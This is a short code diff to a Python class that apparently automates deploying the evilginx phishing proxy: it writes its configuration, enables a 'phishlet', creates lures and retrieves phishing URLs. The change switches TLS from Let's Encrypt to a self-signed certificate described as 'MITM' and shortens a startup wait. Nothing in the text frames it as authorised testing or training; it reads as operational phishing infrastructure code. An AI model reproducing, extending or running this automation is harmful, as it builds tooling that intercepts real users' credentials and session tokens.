@@ -294,7 +294,7 @@ class InstanceManager:
         https_port = int(os.environ.get("AGENT_HTTPS_PORT", payload.get("https_port", 443)))
         dns_port = int(payload["dns_port"]) if payload.get("dns_port") else int(os.environ.get("AGENT_DNS_PORT", "5302"))
         config_dir = Path(payload["config_dir"])
-        autocert = True  # nginx binds to external IP only, 127.0.0.2:80 free for ACME
+        autocert = False  # Let's Encrypt (autocert) can't validate in this fork; use self-signed MITM
         external_ip = payload.get("external_ipv4") or self.settings.external_ip or "127.0.0.1"
 
         write_config(config_dir, base_domain, phishlet_hostname, phishlet_name,
@@ -316,12 +316,9 @@ class InstanceManager:
             logger.info("phishlets enable output: %s", resp[-300:])
             if not proc.alive():
                 raise EvilginxError(f"evilginx crashed after phishlets enable")
-            # Wait for TLS cert setup to complete (can take up to 60s).
-            # Do NOT re-run 'phishlets hostname' as it disables the phishlet.
-            # Instead, just wait and check process is alive.
-            time.sleep(15)
+            time.sleep(3)
             if not proc.alive():
-                raise EvilginxError(f"evilginx died during TLS cert setup")
+                raise EvilginxError(f"evilginx died after enable")
             # lure create + get-url
             lout = proc.send(f"lures create {phishlet_name}", timeout=30)
             logger.info("lures create output: %s", lout[-400:])
